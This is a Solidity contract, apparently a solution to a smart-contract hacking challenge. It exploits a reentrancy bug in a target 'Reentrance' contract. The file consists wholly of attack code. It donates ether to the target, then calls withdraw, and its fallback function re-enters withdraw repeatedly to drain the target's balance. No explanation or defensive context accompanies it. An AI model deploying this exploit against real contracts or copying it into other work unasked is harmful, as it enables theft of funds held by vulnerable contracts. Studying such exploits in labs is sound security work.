pragma solidity ^0.5;

contract Reentrance {
    function withdraw(uint amount) public;
    function donate(address to) public payable;
}

contract HackReentrance {

    Reentrance public target;
    uint public balance;

    constructor(address payable targetAddress) public {
        target = Reentrance(targetAddress);
    }

    function() external payable {
        target.withdraw(balance);
    }

    function donate() public payable {
        balance += msg.value;
        target.donate.value(msg.value)(address(this));
    }

    function reentrance() public {
        target.withdraw(balance);
    }

    function withdraw(uint amount) public {
        target.withdraw(amount);
    }
}
